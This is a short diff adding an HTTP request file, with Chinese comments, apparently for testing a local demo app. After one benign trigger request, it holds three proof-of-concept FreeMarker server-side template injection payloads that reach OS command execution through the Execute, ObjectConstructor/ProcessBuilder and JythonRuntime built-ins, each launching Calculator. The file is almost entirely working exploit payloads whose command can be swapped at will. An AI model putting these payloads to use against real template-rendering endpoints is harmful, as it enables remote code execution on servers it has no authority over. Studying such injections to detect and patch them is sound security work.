@@ -1,0 +1,42 @@
+###
+# 触发命令
+POST /hello HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/json
+
+{
+  "name": "John"
+}
+
+###
+# POC1 利用 freemarker.template.utility.Execute.exec()  调用 Runtime.getRuntime().exec() 执行
+POST /template HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/json
+
+{
+	"hello.ftl": "<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"open -a Calculator\")}"
+}
+
+
+###
+# POC2 利用 freemarker.template.utility.ObjectConstructor.exec() 调用 newInstance() 执行
+POST /template HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/json
+
+{
+  "hello.ftl": "<#assign value=\"freemarker.template.utility.ObjectConstructor\"?new()>${value(\"java.lang.ProcessBuilder\",\"open\",\"-a\",\"Calculator\").start()}"
+}
+
+###
+# POC3 利用 freemarker.template.utility.JythonRuntime 调用 org.python.core.PrePy.getCommandResult() 执行 java.lang.ProcessBuilder
+POST /template HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/json
+
+{
+  "hello.ftl": "<#assign value=\"freemarker.template.utility.JythonRuntime\"?new()><@value>import os;os.system(\"open -a Calculator\")</@value>"
+}
+
+
